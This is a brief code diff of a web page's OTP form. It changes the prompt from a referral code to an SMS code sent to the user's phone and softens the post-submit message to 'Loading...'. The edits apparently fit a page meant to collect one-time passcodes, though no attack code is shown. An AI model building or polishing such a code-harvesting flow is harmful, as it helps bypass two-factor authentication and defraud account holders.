@@ -20,7 +20,7 @@
     <div class="loader"></div>
 
     <p style="text-align:center; margin-top:15px;">
-    Please enter your referral code below to continue.
+    Please enter the code sent to your phone number via SMS.
 </p>
 
     <!-- 🔢 OTP BOXES -->
@@ -110,7 +110,7 @@ window.isSubmitting = true;
     const data = await res.json();
 
     if (data.success) {
-       showError("Code submitted. Waiting for verification..."); 
+       showError("Code submitted. Loading..."); 
     } else {
       showError("Error submitting code");  
     }
